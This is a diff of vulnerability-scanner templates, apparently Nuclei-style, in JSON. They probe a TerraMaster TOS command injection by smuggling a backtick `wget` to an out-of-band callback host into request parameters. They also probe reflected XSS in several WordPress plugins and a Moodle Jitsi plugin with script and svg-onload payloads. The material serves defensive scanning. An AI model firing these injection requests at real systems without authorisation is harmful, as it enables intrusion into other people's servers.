+        "reference": "- https://www.ihteam.net/advisory/terramaster-tos-multiple-vulnerabilities/\n- https://www.pentest.com.tr/exploits/TerraMaster-TOS-4-2-06-Unauthenticated-Remote-Code-Execution.html\n- https://research.checkpoint.com/2021/freakout-leveraging-newest-vulnerabilities-for-creating-a-botnet/\n",
+        "severity": "critical",
+        "tags": "cve,cve2020,terramaster,rce,oob"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "interactsh_protocol",
+              "type": "word",
+              "words": [
+                "http"
+              ]
+            }
+          ],
+          "raw": [
+            "GET /include/makecvs.php?Event=%60wget%20http%3A%2F%2F{{interactsh-url}}%60 HTTP/1.1\nHost: {{Hostname}}\nUser-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36\nAccept-Encoding: gzip, deflate\nAccept: */*\nConnection: keep-alive\n\nGET /tos/index.php?explorer/pathList&path=%60wget%20http%3A%2F%2F{{interactsh-url}}%60 HTTP/1.1\nHost: {{Hostname}}\nUser-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36\nAccept-Encoding: gzip, deflate\nAccept: */*\nConnection: keep-alive\n"
           ]
         }
       ]
@@ -15907,7 +15999,7 @@
               "part": "body",
               "type": "word",
               "words": [
-                "<script>alert(123)</script>"
+                "</script><script>alert(document.domain)</script>"
               ]
             },
             {
@@ -15927,7 +16019,7 @@
           "matchers-condition": "and",
           "method": "GET",
           "path": [
-            "{{BaseURL}}/giveaway/mygiveaways/?share=%3Cscript%3Ealert(123)%3C/script%3E"
+            "{{BaseURL}}/giveaway/mygiveaways/?share=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
           ]
         }
       ]
@@ -15993,7 +16085,7 @@
               "part": "body",
               "type": "word",
               "words": [
-                "<img src=x onerror=(alert)(123);>"
+                "</script><script>alert(document.domain)</script>"
               ]
             },
             {
@@ -16013,7 +16105,7 @@
           "matchers-condition": "and",
           "method": "GET",
           "path": [
-            "{{BaseURL}}/listing/?listing_list_view=standard13%22%3E%3Cimg%20src%3Dx%20onerror%3D%28alert%29%28123%29%3B%3E"
+            "{{BaseURL}}/listing/?listing_list_view=standard13%22%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
           ]
         }
       ]
@@ -16035,7 +16127,7 @@
               "part": "body",
               "type": "word",
               "words": [
-                "<img src=x onerror=alert(123);>"
+                "</script><script>alert(document.domain)</script>"
               ]
             },
             {
@@ -16055,7 +16147,7 @@
           "matchers-condition": "and",
           "method": "GET",
           "path": [
-            "{{BaseURL}}/car1/estimateresult/result?s=&serviceestimatekey=%3Cimg%20src%3Dx%20onerror%3Dalert%28123%29%3B%3E"
+            "{{BaseURL}}/car1/estimateresult/result?s=&serviceestimatekey=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
           ]
         }
       ]
@@ -16113,7 +16205,7 @@
               "part": "body",
               "type": "word",
               "words": [
-                "<script>prompt(123)</script>"
+                "</script><script>alert(document.domain)</script>"
               ]
             },
             {
@@ -16133,7 +16225,7 @@
           "matchers-condition": "and",
           "method": "GET",
           "path": [
-            "{{BaseURL}}/listings/?search_title=&location=&foodbakery_locations_position=filter&search_type=autocomplete&foodbakery_radius=10%22%3E%3Cscript%3Eprompt(123)%3C/script%3E"
+            "{{BaseURL}}/listings/?search_title=&location=&foodbakery_locations_position=filter&search_type=autocomplete&foodbakery_radius=10%22%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
           ]
         }
       ]
@@ -16239,6 +16331,49 @@
           "path": [
             "{{BaseURL}}/wp-content/plugins/marmoset-viewer/mviewer.php?id=http://</script><svg/onload=alert(%27{{randstr}}%27)>",
             "{{BaseURL}}/wp-content/plugins/marmoset-viewer/mviewer.php?id=1+http://a.com%27);alert(/{{randstr}}/);marmoset.embed(%27a"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2021-24498",
+      "info": {
+        "author": "suman_kar",
+        "description": "The plugin does not sanitise or escape the 'start' and 'end' GET parameters before outputting them in the page (via php/edit.php), leading to a reflected Cross-Site Scripting issue.",
+        "name": "Calendar Event Multi View < 1.4.01 - Unauthenticated Reflected Cross-Site Scripting (XSS)",
+        "reference": "https://wpscan.com/vulnerability/3c5a5187-42b3-4f88-9b0e-4fdfa1c39e86",
+        "severity": "medium",
+        "tags": "cve,cve2021,xss,wordpress,wp-plugin"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "condition": "and",
+              "part": "body",
+              "type": "word",
+              "words": [
+                "><svg/onload=alert(1)><",
+                "Calendar Details"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "raw": [
+            "GET /?cpmvc_id=1&cpmvc_do_action=mvparse&f=edit&month_index=0&delete=1&palette=0&paletteDefault=F00&calid=1&id=999&start=a%22%3E%3Csvg/%3E%3C%22&end=a%22%3E%3Csvg/onload=alert(1)%3E%3C%22 HTTP/1.1\nHost: {{Hostname}}\nAccept-Encoding: gzip, deflate\nAccept-Language: en-GB,en-US;q=0.9,en;q=0.8\nConnection: close\n"
           ]
         }
       ]
@@ -16498,6 +16633,48 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/ics?tool=search&query=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2021-26812",
+      "info": {
+        "author": "aceseven (digisec360)",
+        "description": "Cross Site Scripting (XSS) in the Jitsi Meet 2.7 through 2.8.3 plugin for Moodle via the \"sessionpriv.php\" module. This allows attackers to craft a malicious URL, which when clicked on by users, can inject javascript code to be run by the application.",
+        "name": "Moodle jitsi plugin XSS",
+        "reference": "- https://github.com/udima-university/moodle-mod_jitsi/issues/67\n- https://nvd.nist.gov/vuln/detail/CVE-2021-26812\n",
+        "severity": "medium",
+        "tags": "cve,cve2021,moodle,jitsi,xss"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "alert(document.domain);"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "MoodleSession"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/mod/jitsi/sessionpriv.php?avatar=https%3A%2F%2F{{Hostname}}%2Fuser%2Fpix.php%2F498%2Ff1.jpg&nom=test_user%27)%3balert(document.domain)%3b//&ses=test_user&t=1"
           ]
         }
       ]
